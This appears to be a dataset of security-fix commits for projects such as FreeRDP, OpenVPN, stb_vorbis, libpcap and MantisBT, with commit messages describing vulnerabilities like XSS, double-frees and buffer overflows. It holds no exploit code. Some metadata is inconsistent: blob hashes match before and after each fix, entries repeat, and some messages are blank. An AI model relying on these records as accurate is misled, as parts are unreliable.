index: convert `read_entry` to return entry size via an out-param\n\nThe function `read_entry` does not conform to our usual coding style of returning stuff via the out parameter and to use the return value for reporting errors. Due to most of our code conforming to that pattern, it has become quite natural for us to actually return `-1` in case there is any error, which has also slipped in with commit 5625d86b9 (index: support index v4, 2016-05-17). As the function returns an `size_t` only, though, the return value is wrapped around, causing the caller of `read_tree` to continue with an invalid index entry. Ultimately, this can lead to a double-free.\n\nImprove code and fix the bug by converting the function to return the index entry size via an out parameter and only using the return value to indicate errors.\n\nReported-by: Krishna Ram Prakash R <krp@gtux.in> Reported-by: Vivek Parikh <viv0411.parikh@gmail.com>

======================================================================
Commit With Fix: 
    17c363a5162fd4dc77b1df54e48d7bd9bf6b3be7
File(s) In Commit: 
    libfreerdp/codec/zgfx.c
Blob(s) In Commit: 
    551fffc830f94f5d08182ded9804b951f41cb03e
Blob(s) Before Fix: 
    551fffc830f94f5d08182ded9804b951f41cb03e
Projects:
    0359xiaodong_FreeRDP
Commit Message for 17c363a5162fd4dc77b1df54e48d7bd9bf6b3be7:
Fixed CVE-2018-8784\n\nThanks to Eyal Itkin from Check Point Software Technologies.

======================================================================
Commit With Fix: 
    445a5a42c500ceb80f8fa7f2c11f3682538033f3
File(s) In Commit: 
    libfreerdp/core/update.c
Blob(s) In Commit: 
    c2ca42cc4c318d28516c38ed23920ef4145d44dd
Blob(s) Before Fix: 
    c2ca42cc4c318d28516c38ed23920ef4145d44dd
Projects:
    0359xiaodong_FreeRDP
Commit Message for 445a5a42c500ceb80f8fa7f2c11f3682538033f3:
Fixed CVE-2018-8786\n\nThanks to Eyal Itkin from Check Point Software Technologies.

======================================================================
Commit With Fix: 
    09b9d4f1994a674c4ec85b4947aa656eda1aed8a
File(s) In Commit: 
    libfreerdp/gdi/graphics.c
Blob(s) In Commit: 
    159198756b2e27c294b406d49e3ffc351693eaa9
Blob(s) Before Fix: 
    159198756b2e27c294b406d49e3ffc351693eaa9
Projects:
    0359xiaodong_FreeRDP
Commit Message for 09b9d4f1994a674c4ec85b4947aa656eda1aed8a:
Fixed CVE-2018-8787\n\nThanks to Eyal Itkin from Check Point Software Technologies.

======================================================================
Commit With Fix: 
    2ee663f39dc8dac3d9988e847db19b2d7e3ac8c6
File(s) In Commit: 
    winpr/libwinpr/sspi/NTLM/ntlm_message.c
Blob(s) In Commit: 
    ab42dc7377f01c061cba0d4a99c978f866e6aec1
Blob(s) Before Fix: 
    ab42dc7377f01c061cba0d4a99c978f866e6aec1
Projects:
    0359xiaodong_FreeRDP
Commit Message for 2ee663f39dc8dac3d9988e847db19b2d7e3ac8c6:
Fixed CVE-2018-8789\n\nThanks to Eyal Itkin from Check Point Software Technologies.

======================================================================
Commit With Fix: 
    01924cd948dbceb8391be671dab672e9f4a0ffe8
File(s) In Commit: 
    app/View/Events/resolved_attributes.ctp
Blob(s) In Commit: 
    809ea830032258c7485771eb4075af1dc954b243
Blob(s) Before Fix: 
    809ea830032258c7485771eb4075af1dc954b243
Projects:
    0-vortex_MISP
Commit Message for 01924cd948dbceb8391be671dab672e9f4a0ffe8:
fix: Fixed various potential XSS issues in the resolved attributes view\n\n- potentially exposed XSS if a malicious MISP module was loaded on the instance\n\n- as reported by Christophe Vandeplas (@cvandeplas)

======================================================================
Commit With Fix: 
    37720c38d6c617439df0a13e9396fcb26345dadd
File(s) In Commit: 
    app/Model/Attribute.php
Blob(s) In Commit: 
    94ea0d387cab72768427cb49745466487e2640e2
Blob(s) Before Fix: 
    94ea0d387cab72768427cb49745466487e2640e2
Projects:
    0-vortex_MISP
Commit Message for 37720c38d6c617439df0a13e9396fcb26345dadd:
fix: critical API integrity bug, potentially allowing users to delete attributes of other events\n\n- a crafted edit for an event (without attribute UUIDs but attribute IDs set) could overwrite an existing attribute

======================================================================
Commit With Fix: 
    157f471d7e48f190f74e66eb5bc73360b5352fd3
File(s) In Commit: 
    php/elFinder.class.php
Blob(s) In Commit: 
    0ed8272fde5b04a2c94fd4ea69659216604993b1
Blob(s) Before Fix: 
    0ed8272fde5b04a2c94fd4ea69659216604993b1
Projects:
    01coding_elFinder
Commit Message for 157f471d7e48f190f74e66eb5bc73360b5352fd3:
[php:security] fix directory traversal vulnerability\n\nFixed vulnerability that can delete arbitrary files with zipdl command.\n\nFixed it because there was a possibility that files that can be deleted may be deleted by the execution account of the web server.\n\nReviewed-by: Ravindra Rajaram <ravindra.rajaram@ca.com> and Kevin Kotas <kevin.kotas@ca.com>

======================================================================
Commit With Fix: 
    e6351557b86cc10a7651253d2d2aff7f6b918f8e
File(s) In Commit: 
    php/elFinder.class.php
Blob(s) In Commit: 
    fec1143d8a9218c2b55fb9ea0d93864b4b002578
Blob(s) Before Fix: 
    fec1143d8a9218c2b55fb9ea0d93864b4b002578
Projects:
    01coding_elFinder
Commit Message for e6351557b86cc10a7651253d2d2aff7f6b918f8e:
[php:security] re-fix directory traversal vulnerability for windows server\n\nrel. commit 157f471d7e48f190f74e66eb5bc73360b5352fd3

======================================================================
Commit With Fix: 
    0f6ceabab0a8849b47f67d727aa526c2656089ba
File(s) In Commit: 
    util.c
Blob(s) In Commit: 
    32bca06a04996410a985ec212766c7412a676290
Blob(s) Before Fix: 
    32bca06a04996410a985ec212766c7412a676290
Projects:
    AmShaegar13_yubico-pam
Commit Message for 0f6ceabab0a8849b47f67d727aa526c2656089ba:
util: make sure to close the authfile before returning success\n\nfixes #136

======================================================================
Commit With Fix: 
    1394192b210cb3c6624a7419bcf3ff966742e79b
File(s) In Commit: 
    src/openvpnserv/interactive.c
Blob(s) In Commit: 
    861f5e705bc5836539506a7f0f2118a8a144154c
Blob(s) Before Fix: 
    861f5e705bc5836539506a7f0f2118a8a144154c
Projects:
    0x554889e5_openvpn
Commit Message for 1394192b210cb3c6624a7419bcf3ff966742e79b:
Fix potential double-free() in Interactive Service (CVE-2018-9336)\n\nMalformed input data on the service pipe towards the OpenVPN interactive service (normally used by the OpenVPN GUI to request openvpn instances from the service) can result in a double free() in the error handling code.\n\nThis usually only leads to a process crash (DoS by an unprivileged local account) but since it could possibly lead to memory corruption if happening while multiple other threads are active at the same time, CVE-2018-9336 has been assigned to acknowledge this risk.\n\nFix by ensuring that sud->directory is set to NULL in GetStartUpData() for all error cases (thus not being free()ed in FreeStartupData()).\n\nRewrite control flow to use explicit error label for error exit.\n\nDiscovered and reported by Jacob Baines <jbaines@tenable.com>.\n\nCVE: 2018-9336\n\nSigned-off-by: Gert Doering <gert@greenie.muc.de> Acked-by: Selva Nair <selva.nair@gmail.com> Message-Id: <20180414072617.25075-1-gert@greenie.muc.de> URL: https://www.mail-archive.com/search?l=mid&q=20180414072617.25075-1-gert@greenie.muc.de\n\nSigned-off-by: Gert Doering <gert@greenie.muc.de>

======================================================================
Commit With Fix: 
    cb1214c124e1bd61f7dd551b94a794864861592e
File(s) In Commit: 
    coders/meta.c
Blob(s) In Commit: 
    eaebd1fc0e5fd3fc479772f2592e0e02cfc2c44d
Blob(s) Before Fix: 
    eaebd1fc0e5fd3fc479772f2592e0e02cfc2c44d
Projects:
    2016repotsheyue_ImageMagick
Commit Message for cb1214c124e1bd61f7dd551b94a794864861592e:
...

======================================================================
Commit With Fix: 
    345a7b2eed11bb6128421150d65f4f83fdbb737d
File(s) In Commit: 
    lib/schema-inspector.js
Blob(s) In Commit: 
    3113a618ae2fb075c2573f8953be1f88ae60c28c
Blob(s) Before Fix: 
    3113a618ae2fb075c2573f8953be1f88ae60c28c
Projects:
    mtnk_schema-inspector
Commit Message for 345a7b2eed11bb6128421150d65f4f83fdbb737d:
fix: Issue #75

======================================================================
Commit With Fix: 
    de624dacf6a50e39fe3472af1414d44937ce1f03
File(s) In Commit: 
    index.js
Blob(s) In Commit: 
    4ca699809c6d94afee90e1113763bc276723647c
Blob(s) Before Fix: 
    4ca699809c6d94afee90e1113763bc276723647c
Projects:
    async_node-im-resize
Commit Message for de624dacf6a50e39fe3472af1414d44937ce1f03:
fix: check image arguments before processing (#19)\n\nRegex hotfix to check for command injection

======================================================================
Commit With Fix: 
    ea15dddbe0f65694bfde36b78dd488e90f246639
File(s) In Commit: 
    index.js
Blob(s) In Commit: 
    54b8ed67bf3804b3d107a26dca86f35192c7d1ec
Blob(s) Before Fix: 
    54b8ed67bf3804b3d107a26dca86f35192c7d1ec
Projects:
    AlanMoLun_node-s3-uploader
Commit Message for ea15dddbe0f65694bfde36b78dd488e90f246639:
fix: check path argument before processing (#10)\n\nhotfix to re mediate command injection

======================================================================
Commit With Fix: 
    5aec0a08680f0afea387267a8d1b9fbb3379247c
File(s) In Commit: 
    includes/functions/functions.php
Blob(s) In Commit: 
    ed6149bec22af0e158efb64d7a30d9e2fc2346d8
Blob(s) Before Fix: 
    ed6149bec22af0e158efb64d7a30d9e2fc2346d8
Projects:
    unix1_wp-statistics
Commit Message for 5aec0a08680f0afea387267a8d1b9fbb3379247c:
fix xss Attach Get Title Of Page

======================================================================
Commit With Fix: 
    a29ce2817cf43bb1850cf6af114004ac26c7a081
File(s) In Commit: 
    src/Symfony/Component/Security/Http/RememberMe/TokenBasedRememberMeServices.php
Blob(s) In Commit: 
    952211333930e32953ca474c09f8affd4f4b5507
Blob(s) Before Fix: 
    952211333930e32953ca474c09f8affd4f4b5507
Projects:
    007g3m1n1_symfony
Commit Message for a29ce2817cf43bb1850cf6af114004ac26c7a081:
[Security] Add a separator in the remember me cookie hash

======================================================================
Commit With Fix: 
    944e60f083c3bffbc6a0b5112db127a10a66a8ec
File(s) In Commit: 
    src/Symfony/Component/HttpFoundation/Request.php
Blob(s) In Commit: 
    ae3f51b1724fcd37443e29d8855ea7963bb19342
Blob(s) Before Fix: 
    ae3f51b1724fcd37443e29d8855ea7963bb19342
Projects:
    007g3m1n1_symfony
Commit Message for 944e60f083c3bffbc6a0b5112db127a10a66a8ec:
[HttpFoundation] reject invalid method override

======================================================================
Commit With Fix: 
    4944c92761e0a14f04868cbcf4f4e86fd4b7a4a9
File(s) In Commit: 
    android-gif-drawable/src/main/c/decoding.c
Blob(s) In Commit: 
    f8ebb0ae2e6a397979d76c8844a80581c2e776ea
Blob(s) Before Fix: 
    f8ebb0ae2e6a397979d76c8844a80581c2e776ea
Projects:
    12301104-LuYunfeng_android-gif-drawable
Commit Message for 4944c92761e0a14f04868cbcf4f4e86fd4b7a4a9:
Do not realloc array if new raster size is 0.\n\nif realloc() is called with 0 size it may return NULL and this will be incorrectly handled as not enough memory and (also) rasterBits will be freed by realloc but we will not update it.

======================================================================
Commit With Fix: 
    f6945f1e4b157c69e414cd94fe5cde1876aabcc1
File(s) In Commit: 
    ubuntu-server.js
Blob(s) In Commit: 
    89a0349d6618921fa0ecffcd9cc94e68bd0384b4
Blob(s) Before Fix: 
    89a0349d6618921fa0ecffcd9cc94e68bd0384b4
Projects:
    007jedgar_react-native
Commit Message for f6945f1e4b157c69e414cd94fe5cde1876aabcc1:
Fix ubuntu-server vulnerability

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    0f7f61ed1b7b697e283e37bd2d731d0bd57adb55
File(s) In Commit: 
    src/regext.c
Blob(s) In Commit: 
    965c7933d9c06c13284e4245115676647bf2b2d8
Blob(s) Before Fix: 
    965c7933d9c06c13284e4245115676647bf2b2d8
Projects:
    0xflotus_oniguruma
Commit Message for 0f7f61ed1b7b697e283e37bd2d731d0bd57adb55:
Fix CVE-2019-13224: don't allow different encodings for onig_new_deluxe()

======================================================================
Commit With Fix: 
    c509265c5f6ae7264f7b8a8aae1cfa5fc59d108c
File(s) In Commit: 
    src/regcomp.c
Blob(s) In Commit: 
    ff3431f03645f540350a26f07c52d59141a6ba13
Blob(s) Before Fix: 
    ff3431f03645f540350a26f07c52d59141a6ba13
Projects:
    0xflotus_oniguruma
Commit Message for c509265c5f6ae7264f7b8a8aae1cfa5fc59d108c:
Fix CVE-2019-13225: problem in converting if-then-else pattern to bytecode.

======================================================================
Commit With Fix: 
    3ea2a5a026e73d81cd9a3e9bbd4300c433004bfa
File(s) In Commit: 
    src/modules/rlm_eap/types/rlm_eap_pwd/eap_pwd.c
Blob(s) In Commit: 
    d94851c3aa0fc31db9be2d01a4fb94c1a6c81e00
Blob(s) Before Fix: 
    d94851c3aa0fc31db9be2d01a4fb94c1a6c81e00
Projects:
    0xbad0c0d3_freeradius-server
Commit Message for 3ea2a5a026e73d81cd9a3e9bbd4300c433004bfa:
EAP-pwd: fix side-channel leak where 1 in 2018 handshakes fail\n\nPreviously the Hunting and Pecking algorithm of EAP-pwd aborted when more than 10 iterations are needed. Every iteration has a 50% chance of finding the password element. This means one in every 2048 handshakes will fail, in which case an error frame is sent to the client. This event leaks information that can be abused in an offline password brute-force attack. More precisely, the adversary learns that all 10 iterations failed for the given random EAP-pwd token. Using the same techniques as in the Dragonblood attack, this can be used to brute-force the password.\n\nThis patch fixes the above issue by executing enough iterations such that the password element is always found eventually.\n\nNote that timing and cache leaks remain a risk against the current implementation of EAP-pwd.

======================================================================
Commit With Fix: 
    f59d7ed8df2e0e957f7f247fe218032abdbe9a10
File(s) In Commit: 
    nltk/downloader.py
Blob(s) In Commit: 
    e6831f977f1810bf6317392973abda4cd647b8af
Blob(s) Before Fix: 
    e6831f977f1810bf6317392973abda4cd647b8af
Projects:
    0--key_nltk
Commit Message for f59d7ed8df2e0e957f7f247fe218032abdbe9a10:
CVE-2019-14751: Fixed security bug in downloader (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14751)

======================================================================
Commit With Fix: 
    554b56687a19300a75ec24184746b5512580c819
File(s) In Commit: 
    memcached.c
Blob(s) In Commit: 
    788647feb87237fe563bddcc48ecdc7a76843126
Blob(s) Before Fix: 
    788647feb87237fe563bddcc48ecdc7a76843126
Projects:
    0xfacade_memcached
Commit Message for 554b56687a19300a75ec24184746b5512580c819:
fix strncpy call to avoid ASAN violation\n\nEnsure we're only reading to the size of the smallest buffer, since they're both on the stack and could potentially overlap. Overlapping is defined as ... undefined behavior. I've looked through all available implementations of strncpy and they still only copy from the first \0 found.\n\nWe'll also never read past the end of sun_path since we _supply_ sun_path with a proper null terminator.

======================================================================
Commit With Fix: 
    9cee1971c498bbe0a72bca1c773fae50171d8c27
File(s) In Commit: 
    core/classes/IssueAttachmentTimelineEvent.class.php
Blob(s) In Commit: 
    2a6123d87c5e0040911099c3c10da0e767830628
Blob(s) Before Fix: 
    2a6123d87c5e0040911099c3c10da0e767830628
Projects:
    01-Scripts_mantisbt
Commit Message for 9cee1971c498bbe0a72bca1c773fae50171d8c27:
Fix XSS on timeline (CVE-2019-15074)\n\nKamran Saifullah reported a stored cross-site scripting (XSS) vulnerability in Timeline, allowing execution of arbitrary code (if CSP settings permit it) after uploading an attachment with a crafted filename. The code is executed for any user having visibility to the issue, whenever My View Page is displayed.\n\nPrevent the attack by sanitizing the filename before display.\n\nFixes #25995

======================================================================
Commit With Fix: 
    617b12c0339db4891d117b661982126c495439ea
File(s) In Commit: 
    rpcapd/daemon.c
Blob(s) In Commit: 
    19d218ca8c4543b2a66dbff9e6260b63009bb88f
Blob(s) Before Fix: 
    19d218ca8c4543b2a66dbff9e6260b63009bb88f
Projects:
    000Y000_libpcap
Commit Message for 617b12c0339db4891d117b661982126c495439ea:
Calculate the reply payload length in a local variable.\n\nUsing the same variable for the remaining request length and the reply length is confusing at best and can cause errors at worst (if the request had extra stuff at the end, so that the variable is non-zero).\n\nThis addresses Include Security issue I8: [libpcap] Remote Packet Capture Daemon Parameter Reuse.

======================================================================
Commit With Fix: 
    484d60cbf7ca4ec758c3cbb8a82d68b244a78d58
File(s) In Commit: 
    rpcapd/daemon.c
Blob(s) In Commit: 
    c335fb05524c80260fc814468a5c45253582d88b
Blob(s) Before Fix: 
    c335fb05524c80260fc814468a5c45253582d88b
Projects:
    000Y000_libpcap
Commit Message for 484d60cbf7ca4ec758c3cbb8a82d68b244a78d58:
On UN*X, don't tell the client why authentication failed.\n\n"no such user" tells the client that the user ID isn't valid and, therefore, that it needn't bother trying to do password cracking for that user ID  just saying that the authentication failed dosn't give them that hint.\n\nThis resolves the third problem in Include Security issue F11: [libpcap] Remote Packet Capture Daemon Multiple Authentication Improvements.\n\nThe Windows LogonUser() API returns ERROR_LOGON_FAILURE for both cases, so the Windows code doesn't have this issue.  Just return the same "Authentication failed" message on Windows to the user.\n\nFor various authentication failures *other* than "no such user" and "password not valid", log a message, as there's a problem that may need debugging.  We don't need to tell the end user what the problem is, as they may not bother reporting it and, even if they do, they may not give the full error message.

======================================================================
Commit With Fix: 
    437b273761adedcbd880f714bfa44afeec186a31
File(s) In Commit: 
    rpcapd/daemon.c
Blob(s) In Commit: 
    c9b44aafb568db49e47da5b7f540390e78225c56
Blob(s) Before Fix: 
    c9b44aafb568db49e47da5b7f540390e78225c56
Projects:
    000Y000_libpcap
Commit Message for 437b273761adedcbd880f714bfa44afeec186a31:
Don't crash if crypt() fails.\n\nIt can fail, so make sure it doesn't before comparing its result with the password.\n\nThis addresses Include Security issue F12: [libpcap] Remote Packet Capture Daemon Null Pointer Dereference Denial of Service.

======================================================================
Commit With Fix: 
    33834cb2a4d035b52aa2a26742f832a112e90a0a
File(s) In Commit: 
    rpcapd/daemon.c
Blob(s) In Commit: 
    635d3195051da51264343a3dcde55a8afb2c2a9d
Blob(s) Before Fix: 
    635d3195051da51264343a3dcde55a8afb2c2a9d
Projects:
    000Y000_libpcap
Commit Message for 33834cb2a4d035b52aa2a26742f832a112e90a0a:
In the open request, reject capture sources that are URLs.\n\nYou shouldn't be able to ask a server to open a remote device on some *other* server  just open it yourself.\n\nThis addresses Include Security issue F13: [libpcap] Remote Packet Capture Daemon Allows Opening Capture URLs.

======================================================================
Commit With Fix: 
    bd094dede74ff6e313e286e949e2387233a96eea
File(s) In Commit: 
    proj_doc_edit_page.php
Blob(s) In Commit: 
    759bc1bd01288bd03badfd346fa2b5839024e4c6
Blob(s) Before Fix: 
    759bc1bd01288bd03badfd346fa2b5839024e4c6
Projects:
    01-Scripts_mantisbt
Commit Message for bd094dede74ff6e313e286e949e2387233a96eea:
Fix XSS on project documentation\n\nVulnerability in deprecated project documentation functionality ($g_enable_project_documentation), allowing execution of arbitrary code (if CSP settings permit it) after uploading an attachment with a crafted filename.\n\nPrevent the attack by sanitizing the filename before display.\n\nFixes #26078

======================================================================
Commit With Fix: 
    5797f013b3be450c146a4141514bda525f2f1b51
File(s) In Commit: 
    zerver/lib/bugdown/__init__.py
Blob(s) In Commit: 
    67e8a9fdeb86e1cb39b9d5e1d4d5a7a22c364a24
Blob(s) Before Fix: 
    67e8a9fdeb86e1cb39b9d5e1d4d5a7a22c364a24
Projects:
    0x218_mattermost-server
Commit Message for 5797f013b3be450c146a4141514bda525f2f1b51:
CVE-2019-16215: Fix DoS vulnerability in Markdown LINK_RE.\n\nAny regex including a match-everything subpattern (.*, .*?, .+, or .+?) is almost automatically wrong because it fails to disambiguate when one subpattern should end and another should begin.  Among other bugs, these kind of regexes tend to be especially prone to denial of service vulnerabilities through catastrophic backtracking on strings that fail to match in a large (in this case, exponential) number of ways.\n\nLacking a specification to say what characters should actually be allowed in these subpatterns (this syntax is too different from CommonMark to be able to precisely apply those rules), I’ve tried to make reasonable guesses and avoid changing much else.\n\nBecause Zulip doesn't store messages until they have successfully been processed by the Markdown processor, this is not a stored DoS issue.\n\nIn general, Zulip protects against the broad category of DoS issues in Markdown rendering via a timeout managed by another thread.  However, details of Python's regular expression implementation mean that this particular issue could prevent the timeout thread from being scheduled, resulting in this being a DoS issue.\n\nThis was fixed in master a few months ago as a side effect of abe2dab88ca96786bb32dea6caab873819b8c482 (#12979).\n\nSigned-off-by: Anders Kaseorg <anders@zulipchat.com>

======================================================================
Commit With Fix: 
    f8c6eb67cd9da09ee20248fec6ab742069635e47
File(s) In Commit: 
    modules/luci-base/luasrc/dispatcher.lua
Blob(s) In Commit: 
    f571144566fffb9e689cb53a6a4dd7398a0c3997
Blob(s) Before Fix: 
    f571144566fffb9e689cb53a6a4dd7398a0c3997
Projects:
    0saga0_openwrt
Commit Message for f8c6eb67cd9da09ee20248fec6ab742069635e47:
luci-base: fix CSRF prevention for arcombine targets\n\nThe dispatcher failed to propagate the child target post security requirements to the arcombine() dispatch target so far - fix this by recursively testing the post security requirements.\n\nSigned-off-by: Jo-Philipp Wich <jo@mein.io>

======================================================================
Commit With Fix: 
    fc85be7123050b91b054e45b91c78d3241a5047a
File(s) In Commit: 
    librabbitmq/amqp_connection.c
Blob(s) In Commit: 
    b106f70afad794fcd1791855435ee829857aca02
Blob(s) Before Fix: 
    b106f70afad794fcd1791855435ee829857aca02
Projects:
    13812453806_rabbitmq-c
Commit Message for fc85be7123050b91b054e45b91c78d3241a5047a:
lib: check frame_size is >= INT32_MAX\n\nWhen parsing a frame header, validate that the frame_size is less than or equal to INT32_MAX. Given frame_max is limited between 0 and INT32_MAX in amqp_login and friends, this does not change the API.\n\nThis prevents a potential buffer overflow when a malicious client sends a frame_size that is close to UINT32_MAX, in which causes an overflow when computing state->target_size resulting in a small value there. A buffer is then allocated with the small amount, then memcopy copies the frame_size writing to memory beyond the end of the buffer.

======================================================================
Commit With Fix: 
    3961268597abba4c2b231790cb4aa7936e73cdf8
File(s) In Commit: 
    applications/luci-app-firewall/luasrc/model/cbi/firewall/rule-details.lua
Blob(s) In Commit: 
    df66771299b82b83ba89500e425c5c202fe81f8e
Blob(s) Before Fix: 
    df66771299b82b83ba89500e425c5c202fe81f8e
Projects:
    0saga0_openwrt
Commit Message for 3961268597abba4c2b231790cb4aa7936e73cdf8:
luci-app-firewall: fix stored XSS in rule-details.lua\n\nA previous fix to this file failed to address a second instance of the same issue.\n\nFixes: c048f23ba ("luci-app-firewall: fix stored XSS in rule- and forward detail pages") Signed-off-by: Jo-Philipp Wich <jo@mein.io>

======================================================================
Commit With Fix: 
    f6d684ade99dd37b21babaa8a856f64faa1e2e0d
File(s) In Commit: 
    src/parser.c
Blob(s) In Commit: 
    e5d7ebbd692aa9b1dd0cd2c8d65d8d029dd42fd6
Blob(s) Before Fix: 
    e5d7ebbd692aa9b1dd0cd2c8d65d8d029dd42fd6
Projects:
    6WIND_libyang
Commit Message for f6d684ade99dd37b21babaa8a856f64faa1e2e0d:
parser BUGFIX long identity name buffer overflow\n\nSTRING_OVERFLOW (CWE-120)

======================================================================
Commit With Fix: 
    6980afae2ff9fcd6d67508b0a3f694d75fd059d6
File(s) In Commit: 
    src/parser.c
Blob(s) In Commit: 
    4828c7c0c8d64315c10bc2bd894db5816d114da7
Blob(s) Before Fix: 
    4828c7c0c8d64315c10bc2bd894db5816d114da7
Projects:
    6WIND_libyang
Commit Message for 6980afae2ff9fcd6d67508b0a3f694d75fd059d6:
parser BUGFIX long identityref default value buffer overflow\n\nSTRING_OVERFLOW (CWE-120)

======================================================================
Commit With Fix: 
    c1be55f97211d38b69ac0c2027e6812ab8b1b94e
File(s) In Commit: 
    src/http/ngx_http_special_response.c
Blob(s) In Commit: 
    76e6705889f8715bc83371c9111025983a134c45
Blob(s) Before Fix: 
    76e6705889f8715bc83371c9111025983a134c45
Projects:
    0x5446_lua-nginx-module
Commit Message for c1be55f97211d38b69ac0c2027e6812ab8b1b94e:
Discard request body when redirecting to a URL via error_page.\n\nReported by Bert JW Regeer and Francisco Oca Gonzalez.

======================================================================
Commit With Fix: 
    62041428a32de402e0be6ba45fe12df6a83bedb8
File(s) In Commit: 
    auth_mellon_util.c
Blob(s) In Commit: 
    fd442f90e4f12669e18f64095c441881b8614c8d
Blob(s) Before Fix: 
    fd442f90e4f12669e18f64095c441881b8614c8d
Projects:
    AzeemMalik51_mod_auth_mellon
Commit Message for 62041428a32de402e0be6ba45fe12df6a83bedb8:
